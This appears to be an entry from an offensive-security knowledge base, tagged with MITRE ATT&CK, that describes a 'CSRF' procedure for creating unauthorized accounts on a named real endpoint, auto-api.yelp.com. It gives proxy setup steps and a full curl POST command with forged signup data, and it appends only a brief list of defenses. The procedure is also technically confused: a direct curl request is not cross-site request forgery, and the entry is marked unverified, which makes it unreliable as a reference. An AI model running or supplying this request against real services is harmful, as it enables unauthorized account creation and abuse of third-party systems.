---
tags:
  - csrf
  - web
  - execution
type: procedure
tools:
  - '[[tools/Charles-Proxy]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-post-csrf-signup]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:36.053Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f07a1f7e-7fcf-424f-ad23-3db0a564e4e3
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Execute-CSRF-Account-Creation-via-Proxy

## Summary

This procedure submits a forged POST request to the vulnerable signup endpoint using a proxy to create an unauthorized account, demonstrating CSRF exploitation.

## Description

Using the crafted form data, send a POST to https://auto-api.yelp.com/account/create_secure with headers and params. The request includes form data like first_name=Test1, last_name=Test2, email=test@example.com, password=123123qq, user_country_code=AR, city=12333, confirmed=0. Proxy tools like Charles capture and replay for analysis. This simulates victim browser actions, creating accounts without auth. Expected: Successful response with user_id.

## Requirements

1. Proxy tool (Charles) configured for interception
2. Valid endpoint params and form data
3. Network access to auto-api.yelp.com

## Defense

Defensive measures and detection strategies:

- Require CSRF tokens in all forms
- Bind requests to session cookies
- Rate-limit account creations per IP/session

## Objectives

1. Forge and submit signup request
2. Verify account creation success
3. Capture response for validation

## Instructions

### Step 1: Configure Proxy

**Context**: Set up Charles to intercept requests to the endpoint.

Launch Charles and enable SSL proxying for auto-api.yelp.com.

> Expected: All traffic routed through proxy.

### Step 2: Submit POST Request

**Context**: Execute the forged request to create account.

Execute [[commands/curl-post-csrf-signup]]:

```bash
curl -X POST 'https://auto-api.yelp.com/account/create_secure?time=1234567890&nonce=abc123&ywsid=def456&device_type=web&app_version=1.0&cc=US&lang=en&efs=1&signature=xyz789' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'first_name=Test1&last_name=Test2&email=test@example.com&password=123123qq&user_country_code=AR&city=12333&confirmed=0'
```

> Expected: JSON response like {"user_id": 12345, "status": "success"}.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-csrf-signup]]

## Tools Used

- [[tools/Charles-Proxy]]

## Tags

- [[csrf]]
- [[web]]
- [[Execution]]
